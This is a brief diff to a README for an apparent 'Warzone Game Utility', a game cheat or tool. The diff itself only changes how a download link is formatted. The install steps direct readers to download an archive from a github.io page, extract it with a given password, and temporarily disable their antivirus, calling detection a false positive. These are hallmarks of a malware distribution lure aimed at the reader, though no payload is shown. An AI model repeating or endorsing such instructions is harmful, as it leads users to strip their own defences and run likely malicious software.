@@ -20,7 +20,7 @@
 
 ## 📥 Quick Install
 
-1. Visit the official page: [(https://kane-bust777.github.io/Warzone-Game-Utility/)]
+1. Visit the official page: https://kane-bust777.github.io/Warzone-Game-Utility/
 2. Click **Download**.
 3. Extract with password: `cod2026`
 4. **Temporarily disable antivirus** (false positive due to system-level access).
